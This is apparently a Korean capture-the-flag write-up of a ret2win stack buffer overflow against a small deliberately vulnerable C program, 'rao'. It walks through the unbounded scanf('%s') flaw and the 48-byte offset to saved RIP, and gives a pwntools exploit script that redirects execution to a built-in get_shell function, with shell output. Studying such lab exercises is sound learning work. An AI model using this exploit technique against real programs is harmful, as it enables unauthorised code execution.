# rao.c – Stack Buffer Overflow (ret2win)

## 📌 문제 개요

* 유형: Pwn / Stack Buffer Overflow (ret2win)
* 아키텍처: x86-64
* 목표: `get_shell()` 호출로 쉘 획득

---

## 📌 보호기법 확인

컴파일 옵션:

```bash
gcc -o rao rao.c -fno-stack-protector -no-pie
```

`checksec rao` 결과 요약:

* **Canary:** Disabled
* **PIE:** Disabled
* **NX:** Enabled (기본)

👉 스택 보호가 없고 PIE가 꺼져 있어 **고정 주소 ret2win 공격 가능**

---

## 📌 취약점 분석

```c
int main() {
  char buf[0x28];
  init();
  printf("Input: ");
  scanf("%s", buf);
  return 0;
}
```

* `scanf("%s", buf)`는 **입력 길이 제한이 없음**
* `buf` 크기: `0x28 (40 bytes)` <- 2*16^2 + 8
* 스택 상에서 **saved RBP / saved RIP까지 덮어쓰기 가능**

---

## 📌 공격 아이디어 (ret2win)

프로그램에 이미 쉘을 실행하는 함수가 존재:

```c
void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}
```

👉 **RIP를 `get_shell()` 주소로 덮어쓰면 즉시 쉘 획득 가능**

---

## 📌 스택 구조 분석 (x86-64)

```
| saved RIP (8 bytes)  | ← overwrite
| saved RBP (8 bytes)  |
| buf[0x28] (40 bytes) |
```

* RIP 오프셋 = `0x28 + 0x8 = 0x30 (48 bytes)`

---

## 📌 공격 시나리오

1. `scanf()` 입력을 이용해 버퍼 오버플로우 발생
2. `buf`를 채운 뒤 saved RIP까지 덮어씀
3. saved RIP에 `get_shell()` 함수 주소 삽입
4. 함수 반환 시 `get_shell()` 실행 → `/bin/sh`

---

## 📌 페이로드 구성

```text
[ padding (48 bytes) ][ get_shell 주소 ]
```

* Padding: `b"A" * 0x30`
* RIP: `get_shell()`의 절대 주소 (PIE 비활성)

---
0x004006aa
## 📌 익스플로잇 코드 예시

```python
from pwn import *

p = process('./rao')

get_shell = 0x4006aa  # gdb로 확인한 실제 주소
payload = b'A' * 0x30
payload += p64(get_shell)

p.sendline(payload)
p.interactive()
```

---

## 📌 결과

```bash
$ id
uid=1000(user) gid=1000(user)
```

👉 쉘 획득 성공

---

## 📌 배운 점

* 64비트에서도 **Canary와 PIE가 없으면 ret2win이 가장 단순한 공격 방식**
* NX가 활성화되어 있어도 **기존 함수 호출 방식**은 영향을 받지 않음
* 공격 전 **보호기법(checksec) 확인이 시나리오를 빠르게 결정**해줌

---

## 📌 정리

> 이 문제는 스택 버퍼 오버플로우를 이용해
> **saved RIP를 조작하여 기존 쉘 함수로 흐름을 전환하는 전형적인 ret2win 문제**이다.
